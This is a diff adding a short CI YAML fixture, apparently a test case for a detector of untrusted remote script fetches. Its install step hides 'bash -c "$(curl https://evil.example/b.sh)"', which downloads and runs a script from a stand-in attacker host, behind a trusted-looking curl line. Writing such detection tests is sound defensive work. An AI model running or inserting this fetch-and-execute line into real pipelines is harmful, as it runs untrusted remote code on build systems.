@@ -1,0 +1,7 @@
+# violation: the reverse direction of the mixed-line case. A trusted
+# visible-line fetch must never suppress an untrusted fetch hiding inside
+# a command substitution on the same line.
+install:
+  image: alpine:3.19
+  script:
+    - curl -sSL https://get.docker.com/a.sh | cat ; bash -c "$(curl https://evil.example/b.sh)"
